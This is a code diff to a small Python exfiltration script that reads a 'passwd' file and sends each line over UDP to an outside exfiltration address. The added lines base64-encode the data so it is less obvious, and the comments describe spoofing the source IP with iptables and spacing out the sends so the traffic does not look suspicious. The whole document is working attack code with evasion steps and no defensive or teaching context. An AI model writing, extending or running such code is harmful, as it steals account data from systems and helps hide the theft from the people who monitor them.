@@ -1,5 +1,14 @@
 import socket
 import time
+import base64
+
+# Encode each line with base64 to make it less obvious that it's sensitive info
+def encode_data(data):
+        data_bytes = data.encode('ascii')
+        encoded_msg_bytes = base64.b64encode(data_bytes)
+        encoded_msg = encoded_msg_bytes.decode('ascii')
+        return encoded_msg
+
 
 # sudo iptables -A POSTROUTING -t nat -j SNAT --to (IP to spoof) -o (exit interface)
 def process_file(target_file):
@@ -19,9 +28,12 @@ lines = process_file('passwd')
 # Make one socket only 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 for line in lines:
+        # Four our reference within an encrypted line
         print(line)
+        # We send this over socket
+        base64_line = encode_data(line)
 	# Send this data through the wire as bytes and catch it on the other end with sniffer.
-        sock.sendto(bytes(line, "utf-8"), (exfil_ip, exfil_port))
+        sock.sendto(bytes(base64_line, "utf-8"), (exfil_ip, exfil_port))
 	# Randomise these to prevent a steady pattern of data, might look suss.
         time.sleep(10)
 
